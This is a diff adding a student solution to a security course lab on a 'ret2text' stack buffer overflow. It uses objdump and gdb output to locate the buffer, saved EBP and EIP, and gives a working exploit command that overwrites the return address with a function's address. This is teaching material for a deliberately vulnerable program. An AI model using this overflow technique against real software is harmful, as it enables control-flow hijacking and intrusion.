@@ -1,6 +1,6 @@
 # Solutions TP6
-> Author(s): Guillaume Everarts de Velp  
-> Last update: 23-03-2020
+> Author(s): Guillaume Everarts de Velp, Nicolas Rybowski 
+> Last update: 28-03-2020
 
 **Progress**
  - [x] [6.1 Environment Configuration](#61-environment-configuration)
@@ -218,4 +218,133 @@ This might not work for you as addresses might have changed.
 > In "vulnerable.c" you will find a program that we injected shell code into when ASLR was disabled. Can you inject a shellcode into it with ASLR enable?
 > 
 > HINT: Some solutions were presented in the lectures, or feel free to instrument the code and learn about the behaviour on your system before exploiting it.
+
+
+### Solution for `ret2text.c`
+
+The idea of the `ret2text` exploit is to rewrite EIP with the address of a non randomized function that can be found in the text section of the binary.
+
+When we compile the `ret2text.c` file with `gcc` as explained we run into an issue. Indeed, a simple `objdump` on the binary gives the following :
+
+```console
+000011f5 <secret>:
+    11f5:       55                      push   %ebp
+    11f6:       89 e5                   mov    %esp,%ebp
+    11f8:       53                      push   %ebx
+    11f9:       83 ec 04                sub    $0x4,%esp
+    11fc:       e8 74 00 00 00          call   1275 <__x86.get_pc_thunk.ax>
+    1201:       05 ff 2d 00 00          add    $0x2dff,%eax
+    1206:       83 ec 0c                sub    $0xc,%esp
+    1209:       8d 90 0f e0 ff ff       lea    -0x1ff1(%eax),%edx
+    120f:       52                      push   %edx
+    1210:       89 c3                   mov    %eax,%ebx
+    1212:       e8 39 fe ff ff          call   1050 <puts@plt>
+    1217:       83 c4 10                add    $0x10,%esp
+    121a:       90                      nop
+    121b:       8b 5d fc                mov    -0x4(%ebp),%ebx
+    121e:       c9                      leave  
+    121f:       c3                      ret  
+```
+
+As we observe, the non-randomized address of the `secret` function is `000011f5` which is not possible to inject into the buffer due to the NULL bytes.
+
+By giving a try to another compiler, here `clang`, we can obtain an injectable address (`080491d0`) :
+
+```console
+080491d0 <secret>:
+ 80491d0:       55                      push   %ebp
+ 80491d1:       89 e5                   mov    %esp,%ebp
+ 80491d3:       83 ec 08                sub    $0x8,%esp
+ 80491d6:       8d 05 10 a0 04 08       lea    0x804a010,%eax
+ 80491dc:       89 04 24                mov    %eax,(%esp)
+ 80491df:       e8 4c fe ff ff          call   8049030 <printf@plt>
+ 80491e4:       89 45 fc                mov    %eax,-0x4(%ebp)
+ 80491e7:       83 c4 08                add    $0x8,%esp
+ 80491ea:       5d                      pop    %ebp
+ 80491eb:       c3                      ret    
+ 80491ec:       90                      nop
+ 80491ed:       90                      nop
+ 80491ee:       90                      nop
+ 80491ef:       90                      nop
+```
+
+The rest is the usual buffer localization and overflow, that is :
+
+**1. Finding the buffer** We put a breakpoint on the function containing the vulnerable function in order to find the saved EBP and the saved EIP, then a breakpoint before and after the vulnerable function call in order to look at the buffer while injecting code :
+
+```console
+(gdb) disassemble main
+   ...
+   0x0804922a <+58>:    call   0x8049190 <public>
+   0x0804922f <+63>:    xor    %eax,%eax
+   ...
+ End of assembler dump.
+(gdb) b *0x0804922a
+Breakpoint 1 at 0x804922a
+(gdb) disassemble public
+Dump of assembler code for function public:
+   ...
+   0x080491aa <+26>:    call   0x8049050 <strcpy@plt>
+   0x080491af <+31>:    lea    0x804a008,%ecx
+   ...
+End of assembler dump.
+(gdb) b *0x080491aa
+Breakpoint 2 at 0x80491aa
+(gdb) b *0x080491af
+Breakpoint 3 at 0x80491af
+```
+
+**2. Giving a try** Here we try some injections in order to deduce the location and the size of the buffer.
+
+```console
+(gdb) r $(python -c "print('\x90'*16)")
+Breakpoint 1, 0x0804922a in main ()
+(gdb) i r $ebp
+ebp            0xbffff2b8          0xbffff2b8
+```
+We know that the saved EIP will be `0x0804922f` from the first disassembly.
+
+```console
+(gdb) s
+Single stepping until exit from function main,
+which has no line number information.
+
+Breakpoint 2, 0x080491aa in public ()
+(gdb) x/24wx $esp
+0xbffff270:     0xbffff288      0xbffff507      0xb7fb6000      0xb7fb6000
+0xbffff280:     0xbffff2b8      0xbffff507      0xbffff2e4      0xbffff2b8
+0xbffff290:     0xbffff2e4      0xb7fb6000      0xbffff2b8      0x0804922f
+0xbffff2a0:     0xbffff507      0x00000000      0x00000000      0x00000002
+0xbffff2b0:     0xbffff354      0x00000000      0x00000000      0xb7dfd7e1
+0xbffff2c0:     0x00000002      0xbffff354      0xbffff360      0xbffff2e4
+```
+
+We see on the third line (before the injection) the saved EBP and the saved EIP so we found the limit of our stack frame.
+
+```console
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x080491af in public ()
+(gdb) x/24wx $esp
+0xbffff270:     0xbffff288      0xbffff507      0xb7fb6000      0xb7fb6000
+0xbffff280:     0xbffff2b8      0xbffff507      0x90909090      0x90909090
+0xbffff290:     0x90909090      0x90909090      0xbffff200      0x0804922f
+0xbffff2a0:     0xbffff507      0x00000000      0x00000000      0x00000002
+0xbffff2b0:     0xbffff354      0x00000000      0x00000000      0xb7dfd7e1
+0xbffff2c0:     0x00000002      0xbffff354      0xbffff360      0xbffff2e4
+```
+By observing the buffer right after the injection we can see that it is quite small, our guess of 16 bytes was correct since we wrote the last byte of the saved EBP.
+The complete injection is thus composed by a padding of 20 bytes and the address of `secret`.
+
+**3. Exploit** Here is our complete exploit :
+
+```console
+admin@kali:~/SecurityClass/Tutorial-06/6.3$ ./ret2text $(python -c "print('\x90'*20 + '\xd0\x91\x04\x08')")
+public
+secret function
+Segmentation fault
+```
+
+The segfault is expected since right after the execution of `secret` there is no more valid EIP on the stack so the address tried by the program will be invalid.
 
